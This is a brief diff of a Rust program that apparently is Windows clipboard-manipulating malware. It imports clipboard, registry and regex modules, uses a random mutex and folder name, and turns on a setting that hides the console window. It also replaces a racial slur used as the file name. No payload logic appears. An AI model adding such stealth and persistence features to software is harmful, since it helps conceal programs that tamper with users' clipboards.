@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use regex::Regex;
 use std::{
@@ -14,7 +14,7 @@ mod os;
 mod registry;
 mod clipboard;
 
-static FILE_NAME: &str = "nigga.exe";
+static FILE_NAME: &str = "testname.exe";
 static MUTEX: &str = "asdfafds9i867asdf7896";
 static FOLDER_NAME: &str = "asdfsad7f6sd786f";
 
